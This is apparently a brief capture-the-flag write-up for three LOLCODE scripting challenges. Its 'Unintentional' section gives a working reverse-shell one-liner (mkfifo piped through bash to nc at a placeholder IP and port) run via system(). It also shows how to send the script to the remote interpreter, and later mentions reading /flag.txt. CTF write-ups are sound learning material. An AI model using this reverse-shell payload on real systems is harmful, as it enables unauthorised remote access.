# Scripting: The LOL\* Challenges

People figured out how to cheese this one pretty quickly, and I only figured this out 30 mins before the end of the event. As much as I would like to go back and do them the right way, I don't really have time. So, a quick rundown:

## Unintentional
```
IN MAI os GIMME system
system WIT "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc IP PORT >/tmp/f" OK
```
Do this on any of the LOL challenges and you can just get a reverse shell (I used ngrok). You'll need to send the file off to the remote interpreter by doing `cat myscript.lol | nc challenge.nahamcon.com RPORT`, but it works on all 3.

## Intentional
> My best guesses as to what intentional was because most people did it the above way

- **LOLD**: Don't really know what else to do other than a system("cat /flag.txt")
- **LOLD2**: Kind of in the same way you'd approach a blind SQL injection. Figure out each character based on the error
- **LOLD3**: No clue how you'd locate the flag without doing rev shell or using webhooks.
